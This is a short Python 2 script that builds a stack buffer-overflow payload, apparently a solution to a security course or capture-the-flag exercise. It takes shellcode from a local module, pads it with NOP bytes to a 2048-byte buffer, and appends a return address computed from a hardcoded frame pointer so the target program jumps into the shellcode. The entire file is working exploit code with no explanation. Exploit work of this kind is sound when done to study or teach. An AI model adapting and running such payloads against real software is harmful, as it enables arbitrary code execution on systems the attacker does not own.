from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = ebp - 8 - 4 - 4 - 2048
padding = '\x90' * (2048 - len(shellcode))

print shellcode + padding + pack("<I", buf) + pack("<I", ebp + 4)
